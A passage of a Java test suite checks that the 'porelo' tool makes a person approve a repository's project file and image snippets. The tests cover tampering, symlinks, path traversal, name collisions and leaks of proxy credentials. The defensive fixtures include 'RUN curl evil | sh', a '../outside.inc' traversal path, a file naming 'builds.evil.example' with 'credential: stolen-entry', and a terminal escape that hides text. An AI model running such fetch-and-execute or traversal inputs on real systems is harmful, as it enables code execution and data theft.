    @Test
    void theHashCoversEachNamedFileAndItsName() throws Exception {
        withSnippet();
        final String first = firstStart().look(checkout).hash();

        Files.writeString(checkout.resolve("image.inc"), "RUN echo other\n");
        final String changed = firstStart().look(checkout).hash();

        Files.writeString(checkout.resolve("image.inc"), "RUN echo approved\n");
        Files.move(checkout.resolve("image.inc"), checkout.resolve("other.inc"));
        Files.writeString(
                checkout.resolve("project.yml"), WITH_SNIPPET.replace("image.inc", "other.inc"));
        final String renamed = firstStart().look(checkout).hash();

        assertThat(List.of(first, changed, renamed)).doesNotHaveDuplicates();
    }

    @Test
    void whatStartsIsTheCopyWhateverTheCheckoutNowHolds() throws Exception {
        final Path file = withSnippet();
        assertThat(atTerminal("y")).isNotNull();

        Files.writeString(file, FILE.replace("strangers", "strangers"));
        Files.writeString(checkout.resolve("image.inc"), "RUN curl evil | sh\n");

        final Path started = ProjectSource.require(context, "strangers");
        assertThat(started).isEqualTo(copy());
        assertThat(Files.readString(started)).isEqualTo(WITH_SNIPPET);
        assertThat(org.fuin.porelo.core.project.ProjectReader.read(started).imageSnippetLines())
                .contains("RUN echo approved");
    }

    @Test
    void aChangeBetweenTheQuestionAndTheYesStartsWhatWasRead() throws Exception {
        final Path file = withSnippet();
        final FirstStart.Answer read = firstStart().look(checkout);
        Files.writeString(file, FILE);
        Files.writeString(checkout.resolve("image.inc"), "RUN curl evil | sh\n");

        assertThat(firstStart().take(read)).isEqualTo("strangers");

        assertThat(Files.readString(copy())).isEqualTo(WITH_SNIPPET);
        assertThat(Files.readString(copy().resolveSibling("image.inc")))
                .isEqualTo("RUN echo approved\n");
        assertThat(firstStart().look(checkout).outcome())
                .as("the checkout now differs from what was approved")
                .isEqualTo(FirstStart.Outcome.ASK_UNKNOWN_FILE);
    }

    @Test
    void theCheckoutsPathIsNotRegistered() throws Exception {
        withSnippet();
        assertThat(atTerminal("y")).isNotNull();

        assertThat(new ProjectRegistry(context.paths().projects().projectRegistry()).all())
                .doesNotContainKey("strangers");
    }

    @Test
    void aNamedFileThatIsALinkIsRefused() throws Exception {
        withSnippet();
        final Path inside = Files.writeString(checkout.resolve("real.inc"), "RUN echo real\n");
        Files.delete(checkout.resolve("image.inc"));
        Files.createSymbolicLink(checkout.resolve("image.inc"), inside);

        final FirstStart.Answer answer = firstStart().look(checkout);

        assertThat(answer.refusal()).isNotNull();
        assertThat(answer.refusal().reason()).isEqualTo(FirstStart.Reason.FILE_UNREADABLE);
    }

    @Test
    void aNamedFileBehindALinkedDirectoryIsRefused() throws Exception {
        withSnippet();
        final Path real = Files.createDirectories(checkout.resolve("real"));
        Files.writeString(real.resolve("image.inc"), "RUN echo real\n");
        Files.createSymbolicLink(checkout.resolve("linked"), real);
        Files.writeString(
                checkout.resolve("project.yml"),
                WITH_SNIPPET.replace("image.inc", "linked/image.inc"));

        final FirstStart.Answer answer = firstStart().look(checkout);

        assertThat(answer.refusal()).isNotNull();
        assertThat(answer.refusal().reason()).isEqualTo(FirstStart.Reason.FILE_UNREADABLE);
    }

    @Test
    void aNamedFileOutsideTheCheckoutIsRefused() throws Exception {
        Files.writeString(checkout.resolveSibling("outside.inc"), "password-fixture\n");
        Files.writeString(
                checkout.resolve("project.yml"),
                WITH_SNIPPET.replace("image.inc", "../outside.inc"));

        final FirstStart.Answer answer = firstStart().look(checkout);

        assertThat(answer.refusal()).isNotNull();
        assertThat(answer.refusal().reason()).isEqualTo(FirstStart.Reason.FILE_UNREADABLE);
        assertThat(answer.file()).doesNotContain("password-fixture");
    }

    @Test
    void aNamedFileOverTheLimitIsRefused() throws Exception {
        withSnippet();
        Files.write(checkout.resolve("image.inc"), new byte[1024 * 1024 + 1]);

        final FirstStart.Answer answer = firstStart().look(checkout);

        assertThat(answer.refusal()).isNotNull();
        assertThat(answer.refusal().reason()).isEqualTo(FirstStart.Reason.FILE_UNREADABLE);
    }

    /** The draft hash names the exact written bytes and filename, and changes with the draft. */
    @Test
    void aDraftHashCoversItsTextAndRepositoryFileName() throws Exception {
        plugin();
        detector = answering(host("repo.example.org", Finding.Origin.YOURS));
        final FirstStart.Answer answer = firstStart().look(checkout);
        assertThat(answer.project()).isEqualTo("default");
        assertThat(answer.asMap().get("fileName")).isEqualTo("porelo.yml");
        assertThat(firstStart().take(answer)).isEqualTo("default");
        assertThat(checkout.resolve("porelo.yml")).hasContent(answer.file());
        assertThat(answer.hash()).isEqualTo(ProjectApprovals.hash(checkout, List.of("porelo.yml")));
        Files.writeString(checkout.resolve("project.yml"), answer.file());
        assertThat(answer.hash())
                .isNotEqualTo(ProjectApprovals.hash(checkout, List.of("project.yml")));
        Files.delete(checkout.resolve("project.yml"));
        Files.writeString(checkout.resolve("porelo.yml"), answer.file() + "# changed\n");
        assertThatThrownBy(() -> firstStart().confirm(checkout, answer.hash()))
                .isInstanceOfSatisfying(
                        FirstStart.Refused.class,
                        ex -> assertThat(ex.reason()).isEqualTo(FirstStart.Reason.MOVED_ON));
    }

    @Test
    void aYesToAChangedFileReplacesTheCopyAndItsOwnNameIsNotTaken() throws Exception {
        final Path file = withSnippet();
        assertThat(atTerminal("y")).isNotNull();
        Files.writeString(file, WITH_SNIPPET + "# changed\n");

        final FirstStart.Answer asked = firstStart().look(checkout);

        assertThat(asked.refusal()).isNull();
        assertThat(firstStart().take(asked)).isEqualTo("strangers");
        assertThat(Files.readString(copy())).isEqualTo(WITH_SNIPPET + "# changed\n");
        assertThat(firstStart().look(checkout).outcome()).isEqualTo(FirstStart.Outcome.KNOWN);
    }

    @Test
    void aSecondCheckoutOfTheIdenticalFileIsTheSameProject() throws Exception {
        withSnippet();
        assertThat(atTerminal("y")).isNotNull();
        final Path second = Files.createDirectories(root.resolve("second/shop")).toRealPath();
        runner.answering("--show-toplevel", second.toString());
        Files.writeString(second.resolve("image.inc"), "RUN echo approved\n");
        Files.writeString(second.resolve("project.yml"), WITH_SNIPPET);

        final FirstStart.Answer answer = firstStart().look(second);

        assertThat(answer.outcome()).isEqualTo(FirstStart.Outcome.KNOWN);
        assertThat(answer.project()).isEqualTo("strangers");
    }

    private Path secondCheckout(final String origin) throws Exception {
        final Path second = Files.createDirectories(root.resolve("second/shop")).toRealPath();
        runner.answering("--show-toplevel", second.toString());
        runner.answering("get-url origin", origin);
        Files.writeString(second.resolve("image.inc"), "RUN echo approved\n");
        Files.writeString(second.resolve("project.yml"), WITH_SNIPPET);
        checkout = second;
        return second;
    }

    @Test
    void aSecondCloneOfTheSameOriginAndFileAsksNothingAndStartsFromTheCopy() throws Exception {
        withSnippet();
        assertThat(atTerminal("y")).isNotNull();
        secondCheckout(ORIGIN);
        questions.clear();

        final WorkOrigin.Choice choice = atTerminal("n");

        assertThat(questions).isEmpty();
        assertThat(choice.project()).isEqualTo("strangers");
        assertThat(ProjectSource.require(context, "strangers")).isEqualTo(copy());
    }

    @Test
    void theSameFileWithAnotherOriginIsRefusedAndGoesToDefaultSayingSo() throws Exception {
        withSnippet();
        assertThat(atTerminal("y")).isNotNull();
        secondCheckout("https://forge.example/stranger/thing.git");
        questions.clear();

        assertThat(firstStart().look(checkout).refusal().reason())
                .isEqualTo(FirstStart.Reason.NAME_TAKEN);
        assertThat(atTerminal("y")).isNull();

        assertThat(questions).isEmpty();
        assertThat(said.toString()).contains("already has a project 'strangers'", "'default'");
        assertThat(Files.readString(copy())).isEqualTo(WITH_SNIPPET);
    }

    @Test
    void aSecondCheckoutWithNoOriginIsNotTheSameProject() throws Exception {
        runner.failing("get-url origin", 2, "no such remote");
        withSnippet();
        assertThat(atTerminal("y")).isNotNull();
        final Path second = Files.createDirectories(root.resolve("second/shop")).toRealPath();
        runner.answering("--show-toplevel", second.toString());
        Files.writeString(second.resolve("image.inc"), "RUN echo approved\n");
        Files.writeString(second.resolve("project.yml"), WITH_SNIPPET);

        final FirstStart.Answer answer = firstStart().look(second);

        assertThat(answer.outcome()).isEqualTo(FirstStart.Outcome.ASK_UNKNOWN_FILE);
        assertThat(answer.refusal().reason()).isEqualTo(FirstStart.Reason.NAME_TAKEN);
        answer.discard();
    }

    @Test
    void theSameOriginWithAChangedFileAsksAgainAndAYesReplacesTheCopy() throws Exception {
        withSnippet();
        assertThat(atTerminal("y")).isNotNull();
        final Path second = secondCheckout(ORIGIN);
        Files.writeString(second.resolve("image.inc"), "RUN echo changed\n");
        questions.clear();

        assertThat(atTerminal("y")).isNotNull();

        assertThat(questions).hasSize(1);
        assertThat(Files.readString(copy().resolveSibling("image.inc")))
                .isEqualTo("RUN echo changed\n");
    }

    @Test
    void aGitWorktreeOfTheSameRepositoryIsTheSameProject() throws Exception {
        // Real git: in a worktree .git is a file, and the origin has to be read through it.
        final var git = new org.fuin.porelo.core.process.ProcessCommandRunner();
        final java.util.Map<String, String> clean =
                java.util.Map.of("GIT_CONFIG_GLOBAL", "/dev/null", "GIT_CONFIG_NOSYSTEM", "1");
        context =
                new PoreloContext(
                        command -> git.run(command.withEnvironment(clean)),
                        context.paths(),
                        args -> 0,
                        key -> null);
        final java.util.function.BiConsumer<Path, List<String>> inGit =
                (where, arguments) -> {
                    final List<String> all =
                            new ArrayList<>(
                                    List.of(
                                            "git",
                                            "-c",
                                            "user.name=T",
                                            "-c",
                                            "user.email=t@example.org"));
                    all.addAll(arguments);
                    git.runOrFail(
                            org.fuin.porelo.core.process.Command.of(all)
                                    .in(where)
                                    .withEnvironment(clean));
                };
        inGit.accept(checkout, List.of("init", "-q"));
        inGit.accept(checkout, List.of("remote", "add", "origin", ORIGIN));
        withSnippet();
        inGit.accept(checkout, List.of("add", "project.yml", "image.inc"));
        inGit.accept(checkout, List.of("commit", "-q", "-m", "first"));
        assertThat(atTerminal("y")).isNotNull();
        final Path worktree = root.resolve("worktree");
        inGit.accept(checkout, List.of("worktree", "add", "-q", worktree.toString()));
        assertThat(worktree.resolve(".git")).isRegularFile();
        questions.clear();
        checkout = worktree.toRealPath();

        final WorkOrigin.Choice choice = atTerminal("n");

        assertThat(questions).isEmpty();
        assertThat(choice.project()).isEqualTo("strangers");
        assertThat(choice.repository()).isEqualTo("shop");
    }

    @Test
    void aSecondCheckoutWithOtherContentUnderThatNameIsTakenAndTheCopyStays() throws Exception {
        withSnippet();
        assertThat(atTerminal("y")).isNotNull();
        final Path second = Files.createDirectories(root.resolve("attacker")).toRealPath();
        runner.answering("--show-toplevel", second.toString());
        runner.answering("get-url origin", "https://forge.example/other/thing.git");
        Files.writeString(second.resolve("project.yml"), FILE);

        final FirstStart.Answer answer = firstStart().look(second);

        assertThat(answer.refusal()).isNotNull();
        assertThat(answer.refusal().reason()).isEqualTo(FirstStart.Reason.NAME_TAKEN);
        assertThat(Files.readString(copy())).isEqualTo(WITH_SNIPPET);
    }

    private static final String WHOLE =
            "project:\n  name: strangers\n  security_class: online\n"
                    + "  upstream: \"https://forge.example/acme/own.git\"\n"
                    + "image:\n  from: ubuntu:24.04\n  run_file: image.inc\n"
                    + "mail:\n  rules:\n    others: allow\n  outgoing_filter: reporting\n"
                    + "builds:\n  forge: github\n  credential: stolen-entry\n"
                    + "  api: \"https://builds.evil.example\"\n";

    @Test
    void theQuestionShowsTheWholeFileAndItsNamedFiles() throws Exception {
        Files.writeString(checkout.resolve("image.inc"), "RUN echo \u001b[2Jhidden\n");
        Files.writeString(checkout.resolve("project.yml"), WHOLE);

        assertThat(firstStart().look(checkout).refusal()).isNull();
        atTerminal("n");

        assertThat(said.toString())
                .contains(
                        "others: allow",
                        "outgoing_filter",
                        "credential: stolen-entry",
                        "builds.evil.example",
                        "image.inc",
                        "hidden")
                .doesNotContain("\u001b");
    }

    @Test
    void theAnswersFileCarriesTheNamedFilesToo() throws Exception {
        withSnippet();

        assertThat(firstStart().look(checkout).file())
                .contains(WITH_SNIPPET.strip(), "image.inc", "RUN echo approved");
    }

    /** A forge on the host does not turn a repository draft into an online project. */
    @Test
    void aNewRepositoryFileDefinesNoProjectEvenForAHostsForge() throws Exception {
        plugin();
        runner.answering("get-url origin", "http://127.0.0.1:3000/acme/shop.git");

        final FirstStart.Answer answer = firstStart().look(checkout);

        assertThat(answer.project()).isEqualTo("default");
        assertThat(answer.file()).doesNotContain("project:", "security_class:", "repositories:");
        assertThat(answer.file()).doesNotContain("\nmail:", "\nbuilds:", "\ncredentials:");
        assertThat(answer.found())
                .extracting(FirstStart.Found::what)
                .doesNotContain("security class");
    }

    @Test
    void theNameIsCheckedAgainAtTheYesWithTwoQuestionsOpen() throws Exception {
        withSnippet();
        final Path second = Files.createDirectories(root.resolve("attacker")).toRealPath();
        Files.writeString(second.resolve("project.yml"), FILE);
        final FirstStart.Answer first = firstStart().look(checkout);
        runner.answering("--show-toplevel", second.toString());
        runner.answering("get-url origin", "https://forge.example/other/thing.git");
        final FirstStart.Answer other = firstStart().look(second);

        assertThat(firstStart().take(first)).isEqualTo("strangers");

        assertThatThrownBy(() -> firstStart().take(other))
                .isInstanceOfSatisfying(
                        FirstStart.Refused.class,
                        ex -> assertThat(ex.reason()).isEqualTo(FirstStart.Reason.NAME_TAKEN));
        assertThat(ProjectSource.require(context, "strangers")).isEqualTo(copy());
        assertThat(Files.readString(copy())).isEqualTo(WITH_SNIPPET);
    }

    @Test
    void aNoLeavesNoStagedCopyOnThisMachine() throws Exception {
        withSnippet();
        assertThat(atTerminal("n")).isNull();

        final Path projects = context.paths().xdg().config().resolve("projects");
        if (Files.isDirectory(projects)) {
            try (var left = Files.list(projects)) {
                assertThat(left.toList()).isEmpty();
            }
        }
        assertThat(context.paths().projects().projectApprovals()).doesNotExist();
    }

    @Test
    void aDirectoryInNoCheckoutIsRefusedAsANamedValue() {
        runner.failing("--show-toplevel", 128, "not a git repository");

        assertThatThrownBy(() -> firstStart().look(checkout))
                .isInstanceOfSatisfying(
                        FirstStart.Refused.class,
                        ex -> assertThat(ex.reason()).isEqualTo(FirstStart.Reason.NOT_A_CHECKOUT));
    }

    @Test
    void whatAPluginSaysForAPersonReachesTheQuestion() throws Exception {
        plugin();
        detector =
                (plugin, directory, home) ->
                        new Detection(
                                List.of(
                                        new Finding(
                                                Finding.Part.TOOLS,
                                                "package.maven",
                                                "",
                                                "pom.xml",
                                                1,
                                                Finding.Origin.CHECKOUT,
                                                false,
                                                "the extensions here need a build to read")),
                                List.of(
                                        new org.fuin.porelo.ecosystem.api.Unplaced(
                                                "Dockerfile", 3, "a container is built here")));

        final FirstStart.Answer answer = firstStart().look(checkout);
        try {
            assertThat(answer.found().getFirst().note())
                    .isEqualTo("the extensions here need a build to read");
            assertThat(answer.notes())
                    .anyMatch(
                            each ->
                                    each.contains("maven")
                                            && each.contains("Dockerfile:3")
                                            && each.contains("a container is built here"));
            assertThat(answer.asMap().get("notes")).isEqualTo(answer.notes());
        } finally {
            answer.discard();
        }

        atTerminal("n", true);

        assertThat(said.toString())
                .contains("the extensions here need a build to read")
                .contains("a container is built here");
    }

    @Test
    void aNoteIsNotPartOfWhatAYesNames() throws Exception {
        plugin();
        final FirstStart.Answer plain = firstStart().look(checkout);
        final String hash = plain.hash();
        plain.discard();
        detector =
                (plugin, directory, home) ->
                        new Detection(
                                List.of(tool("package.maven", "", "pom.xml")),
                                List.of(
                                        new org.fuin.porelo.ecosystem.api.Unplaced(
                                                "Dockerfile", 3, "a container is built here")));

        final FirstStart.Answer noted = firstStart().look(checkout);
        try {
            assertThat(noted.hash()).isEqualTo(hash);
        } finally {
            noted.discard();
        }
    }

    @Test
    void whatAPluginSaysOfAHostReachesTheQuestionToo() throws Exception {
        plugin();
        detector =
                (plugin, directory, home) ->
                        new Detection(
                                List.of(
                                        new Finding(
                                                Finding.Part.RULES,
                                                "host.nexus.example",
                                                "yes",
                                                "pom.xml",
                                                1,
                                                Finding.Origin.CHECKOUT,
                                                false,
                                                "needed only for publishing")),
                                List.of());

        final FirstStart.Answer answer = firstStart().look(checkout);
        try {
            assertThat(answer.notes())
                    .anyMatch(
                            each ->
                                    each.contains("nexus.example")
                                            && each.contains("needed only for publishing"));
        } finally {
            answer.discard();
        }
    }

    @Test
    void twoPluginsAgreeingKeepBothTheirWords() throws Exception {
        final Path own = context.paths().ecosystemDirectories().getFirst();
        plugin();
        final Path other = own.resolve("gradle");
        Files.writeString(
                other, "#!/bin/sh\nprintf '{\"protocolVersion\":1,\"ecosystem\":\"gradle\"}'\n");
        Files.setPosixFilePermissions(other, PosixFilePermissions.fromString("rwx------"));
        detector =
                (plugin, directory, home) ->
                        new Detection(
                                List.of(
                                        new Finding(
                                                Finding.Part.TOOLS,
                                                "package.maven",
                                                "",
                                                "pom.xml",
                                                1,
                                                Finding.Origin.CHECKOUT,
                                                false,
                                                "said by " + plugin.name())),
                                List.of());

        final FirstStart.Answer answer = firstStart().look(checkout);
        try {
            assertThat(answer.found().getFirst().note())
                    .contains("said by maven")
                    .contains("said by gradle");
        } finally {
            answer.discard();
        }
    }

    @Test
    void aDraftThatCannotBeMadeStillSaysWhatAPluginCouldNotPlace() throws Exception {
        plugin();
        detector =
                (plugin, directory, home) ->
                        new Detection(
                                List.of(host("bad host", Finding.Origin.CHECKOUT)),
                                List.of(
                                        new org.fuin.porelo.ecosystem.api.Unplaced(
                                                "Dockerfile", 3, "a container is built here")));

        final FirstStart.Answer answer = firstStart().look(checkout);
        try {
            assertThat(answer.notes()).anyMatch(each -> each.contains("a container is built here"));
        } finally {
            answer.discard();
        }
    }

    private static final String OWN_NAME =
            "project:\n  name: shop\n  security_class: guarded\n"
                    + "image:\n  from: ubuntu:24.04\n"
                    + "repositories:\n  shop: {}\n";

    private String saidWith(final boolean colour) {
        new FirstStartAtTerminal(firstStart(), new PrintWriter(said), colour)
                .choose(checkout, null, "Start once at a terminal to be asked.");
        return said.toString();
    }

    @Test
    void aFileNotTakenIsAWarningInColourSayingWhatToWrite() throws Exception {
        Files.writeString(checkout.resolve("project.yml"), OWN_NAME);

        assertThat(saidWith(true))
                .contains("\u001b[33mporelo: warning: not taken: project.yml")
                .contains("project.name 'shop'")
                .contains("shop-project")
                .contains("This start runs in 'default', not from this file")
                .contains("\u001b[0m");
    }

    @Test
    void aWarningWithoutColourIsStillOne() throws Exception {
        Files.writeString(checkout.resolve("project.yml"), OWN_NAME);

        assertThat(saidWith(false))
                .contains("porelo: warning: not taken: project.yml")
                .doesNotContain("\u001b");
    }

    @Test
    void aFileNobodyWasThereToApproveIsAWarningToo() throws Exception {
        plugin();
        Files.writeString(checkout.resolve("project.yml"), FILE);

        assertThat(saidWith(true)).contains("\u001b[33mporelo: warning: nothing written");
    }

    @Test
    void anInterfaceIsToldWhyAFileIsNotTaken() throws Exception {
        Files.writeString(checkout.resolve("project.yml"), OWN_NAME);

        final FirstStart.Answer answer = firstStart().look(checkout);
        try {
            assertThat(String.valueOf(answer.asMap().get("refusal")))
                    .contains("project.name 'shop'")
                    .contains("shop-project");
        } finally {
            answer.discard();
        }
    }

    @Test
    void aFileAPersonAnsweredNoToIsNoWarning() throws Exception {
        plugin();

        atTerminal("n");

        assertThat(said.toString()).doesNotContain("warning:");
    }

    @Test
    void aWarningIsPaintedByWhereItGoesAndNotByWhereTheRestGoes() throws Exception {
        final Path terminal = root.resolve("fd-terminal");
        Files.createSymbolicLink(terminal, Path.of("/dev/pts/7"));
        final Path file = root.resolve("fd-file");
        Files.createSymbolicLink(file, root.resolve("start.log"));

        assertThat(FirstStartAtTerminal.colours(terminal, null)).isTrue();
        assertThat(FirstStartAtTerminal.colours(terminal, "")).as("NO_COLOR, even empty").isFalse();
        assertThat(FirstStartAtTerminal.colours(file, null)).isFalse();
    }

    @Test
    void theNameRefusalSaysBothWaysOutOfIt() throws Exception {
        Files.writeString(checkout.resolve("project.yml"), OWN_NAME);

        assertThat(saidWith(false))
                .contains("project of this one repository")
                .contains("rename that repository");
    }

    private static final String PROXY = "http://someone:not-a-real-one@proxy.example:3128";

    private static final String FETCHED =
            "RUN set -eu; mkdir -p /opt/java; curl -fsSL -o /tmp/java.tgz"
                    + " 'https://example.org/temurin/25.0.5/jdk_x64_linux_hotspot_25.0.5_11.tar.gz';"
                    + " echo '0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"
                    + "  /tmp/java.tgz' | sha256sum -c -; tar xzf /tmp/java.tgz -C /opt/java"
                    + " --strip-components=1; rm /tmp/java.tgz; ln -s /opt/java/bin/* /usr/local/bin/";

    /** What each lookup was given: the plugin, the findings and the proxy settings. */
    private final List<Object> lookedUp = new ArrayList<>();

    /** What the next lookup answers, or throws. */
    private java.util.function.Supplier<java.util.Optional<List<Finding>>> lookup =
            () ->
                    java.util.Optional.of(
                            List.of(
                                    tool("run.java", FETCHED, "pom.xml"),
                                    tool("env.JAVA_HOME", "/opt/java", "pom.xml")));

    /** Each plugin answers a finding of its own name, and looks up through {@link #lookup}. */
    private EcosystemDetector lookingUp() {
        return new EcosystemDetector() {
            @Override
            public Detection detect(
                    final org.fuin.porelo.ecosystem.api.InstalledEcosystems.Description plugin,
                    final Path directory,
                    final Path home) {
                detected++;
                return new Detection(
                        List.of(
                                tool("package.maven", "", "pom.xml"),
                                tool("java.version." + plugin.name(), "25", "pom.xml")),
                        List.of());
            }

            @Override
            public java.util.Optional<List<Finding>> resolve(
                    final org.fuin.porelo.ecosystem.api.InstalledEcosystems.Description plugin,
                    final Path directory,
                    final Path home,
                    final List<Finding> findings,
                    final java.util.Map<String, String> proxies) {
                lookedUp.add(List.of(plugin.name(), findings, proxies));
                return lookup.get();
            }
        };
    }

    private void plugin(final String name) throws Exception {
        final Path plugin =
                Files.createDirectories(context.paths().ecosystemDirectories().getFirst())
                        .resolve(name);
        Files.writeString(
                plugin,
                "#!/bin/sh\nprintf '{\"protocolVersion\":1,\"ecosystem\":\"" + name + "\"}'\n");
        Files.setPosixFilePermissions(plugin, PosixFilePermissions.fromString("rwx------"));
    }

    @Test
    void aLookupReplacesThatPluginsFindingsWholeAndTheQuestionShowsItsLinesWhole()
            throws Exception {
        plugin();
        detector = lookingUp();

        final FirstStart.Answer plain = firstStart().look(checkout);
        final String withoutLookup = plain.hash();
        plain.discard();
        final FirstStart.Answer answer =
                firstStart().look(checkout, java.util.Map.of("HTTPS_PROXY", PROXY));
        try {
            assertThat(lookedUp)
                    .as("the plugin is given its own Detect answer and the proxy settings")
                    .containsExactly(
                            List.of(
                                    "maven",
                                    List.of(
                                            tool("package.maven", "", "pom.xml"),
                                            tool("java.version.maven", "25", "pom.xml")),
                                    java.util.Map.of("HTTPS_PROXY", PROXY)));
            assertThat(answer.found())
                    .extracting(FirstStart.Found::what, FirstStart.Found::value)
                    .as("its answer replaces what Detect found, and every fetched line is whole")
                    .containsExactly(
                            org.assertj.core.groups.Tuple.tuple("image line", FETCHED),
                            org.assertj.core.groups.Tuple.tuple(
                                    "image env", "JAVA_HOME=/opt/java"));
            assertThat(answer.file()).contains(FETCHED, "JAVA_HOME");
            assertThat(answer.hash())
                    .as("the fetched lines are part of what a yes names")
                    .isNotEqualTo(withoutLookup);
        } finally {
            answer.discard();
        }
    }

    @Test
    void theQuestionAtATerminalShowsEveryFetchedLineWhole() throws Exception {
        plugin();
        detector = lookingUp();

        assertThat(atTerminal("n")).isNull();

        assertThat(said.toString())
                .as("they run as root of the build, so a person reads them before a yes")
                .contains("  image line  " + FETCHED + "\n")
                .contains("  image env  JAVA_HOME=/opt/java");

        said.getBuffer().setLength(0);
        atTerminal("n", true);
        assertThat(said.toString())
                .contains("found    image line " + FETCHED + " (pom.xml)")
                .contains("found    image env JAVA_HOME=/opt/java");
    }

    @Test
    void aFirstStartSaysWhatItFoundInOneLineAndEverythingWithNotes() throws Exception {
        plugin();
        detector =
                answering(
                        tool("package.maven", "", "pom.xml"),
                        host("repo.example.org", Finding.Origin.YOURS),
                        host("central.example.org", Finding.Origin.YOURS));

        atTerminal("n");

        final java.util.List<String> lines = said.toString().lines().toList();
        assertThat(lines.getFirst())
                .startsWith("porelo: this repository has no porelo.yml; found ")
                .contains("package.maven")
                .contains("opens 2 hosts")
                .endsWith("porelo task start --notes)")
                .doesNotContain("pom.xml", "repo.example.org");
        assertThat(lines).noneMatch(line -> line.contains("takes this repository from"));
        assertThat(lines).as("one line, then what a no says").hasSize(2);

        said.getBuffer().setLength(0);
        atTerminal("n", true);
        assertThat(said.toString())
                .contains("pom.xml", "repo.example.org", "central.example.org")
                .contains("stays in 'default'");
    }

    @Test
    void eachPluginIsGivenItsOwnDetectAnswerAndNoOthers() throws Exception {
        plugin("maven");
        plugin("npm");
        detector = lookingUp();
        lookup = java.util.Optional::empty;

        firstStart().look(checkout, java.util.Map.of()).discard();

        assertThat(lookedUp)
                .extracting(each -> (Object) ((List<?>) each).subList(0, 2))
                .containsExactlyInAnyOrder(
                        List.of(
                                "maven",
                                List.of(
                                        tool("package.maven", "", "pom.xml"),
                                        tool("java.version.maven", "25", "pom.xml"))),
                        List.of(
                                "npm",
                                List.of(
                                        tool("package.maven", "", "pom.xml"),
                                        tool("java.version.npm", "25", "pom.xml"))));
    }

    @Test
    void aPluginThatCannotSayOrFailsLeavesWhatDetectFoundAndANote() throws Exception {
        plugin();
        detector = lookingUp();

        for (final java.util.function.Supplier<java.util.Optional<List<Finding>>> answered :
                List.<java.util.function.Supplier<java.util.Optional<List<Finding>>>>of(
                        java.util.Optional::empty,
                        () -> {
                            throw new org.fuin.porelo.ecosystem.api.EcosystemException(
                                    "maven did not answer within 20 seconds " + PROXY);
                        })) {
            lookup = answered;
            final FirstStart.Answer answer =
                    firstStart().look(checkout, java.util.Map.of("HTTPS_PROXY", PROXY));
            try {
                assertThat(answer.outcome()).isEqualTo(FirstStart.Outcome.ASK_NEW);
                assertThat(answer.found())
                        .extracting(FirstStart.Found::what)
                        .as("what Detect found stands, so the question still has a yes")
                        .contains("package.maven", "java.version.maven");
                assertThat(answer.notes())
                        .as("the note names what was asked")
                        .anyMatch(
                                each ->
                                        each.startsWith(
                                                "maven could not look up package.maven,"
                                                        + " java.version.maven 25: "));
                assertThat(answer.asMap().toString())
                        .as("never the plugin's words, which may repeat its proxy")
                        .doesNotContain("not-a-real-one");
            } finally {
                answer.discard();
            }
        }
    }

    @Test
    void aReplyThatDoesNotParseSaysNothingOfIt() throws Exception {
        plugin();
        detector = lookingUp();
        // A parser's message may quote the reply, and the reply may repeat the proxy.
        lookup =
                () -> {
                    throw new IllegalArgumentException("duplicate key " + PROXY);
                };

        final FirstStart.Answer answer =
                firstStart().look(checkout, java.util.Map.of("http_proxy", PROXY));
        try {
            assertThat(answer.asMap().toString()).doesNotContain("not-a-real-one");
            assertThat(answer.notes()).anyMatch(each -> each.contains("it failed or took longer"));
        } finally {
            answer.discard();
        }
    }

    @Test
    void aLookupThroughOneProxyIsNotHandedToACallerOfAnother() throws Exception {
        plugin();
        detector = lookingUp();
        final FirstStart asking = firstStart();
        asking.look(checkout, java.util.Map.of("http_proxy", PROXY)).discard();
        final int before = lookedUp.size();
        asking.look(checkout, java.util.Map.of()).discard();

        assertThat(lookedUp).as("another proxy is another lookup").hasSize(before + 1);
    }

    @Test
    void anAnswerRepeatingAProxySettingIsNotUsed() throws Exception {
        plugin();
        detector = lookingUp();
        lookup =
                () ->
                        java.util.Optional.of(
                                List.of(tool("run.java", "RUN curl -x " + PROXY, "pom.xml")));

        final FirstStart.Answer answer =
                firstStart().look(checkout, java.util.Map.of("http_proxy", PROXY));
        try {
            assertThat(answer.asMap().toString())
                    .as("a proxy's address may hold a credential")
                    .doesNotContain("not-a-real-one");
            assertThat(answer.file()).doesNotContain("not-a-real-one");
            assertThat(answer.notes())
                    .anyMatch(each -> each.contains("its answer holds a proxy setting"));
        } finally {
            answer.discard();
        }
    }

    @Test
    void theYesMeetsTheLookupItsQuestionMadeAndAMissLooksUpAnew() throws Exception {
        plugin();
        detector = lookingUp();
        final FirstStart asking = firstStart();
        final FirstStart.Answer asked = asking.look(checkout, java.util.Map.of());
        asked.discard();
        // A plugin asked again may answer a newer version than the person read.
        lookup =
                () -> java.util.Optional.of(List.of(tool("run.java", "RUN echo newer", "pom.xml")));

        assertThatThrownBy(() -> firstStart().confirm(checkout, asked.hash(), java.util.Map.of()))
                .as("another question's yes looks up anew, and meets another text")
                .isInstanceOfSatisfying(
                        FirstStart.Refused.class,
                        refused ->
                                assertThat(refused.reason()).isEqualTo(FirstStart.Reason.MOVED_ON));
        assertThat(lookedUp).hasSize(2);

        assertThat(asking.confirm(checkout, asked.hash(), java.util.Map.of())).isEqualTo("default");
        assertThat(lookedUp).as("the yes took the question's own lookup").hasSize(2);
        assertThat(Files.readString(checkout.resolve("porelo.yml")))
                .as("what the person read is what is written")
                .contains(FETCHED)
                .doesNotContain("newer");
    }

    @Test
    void nobodyToAskLooksNothingUp() throws Exception {
        plugin();
        detector = lookingUp();

        unattended();

        assertThat(detected).isPositive();
        assertThat(lookedUp).isEmpty();
    }
}
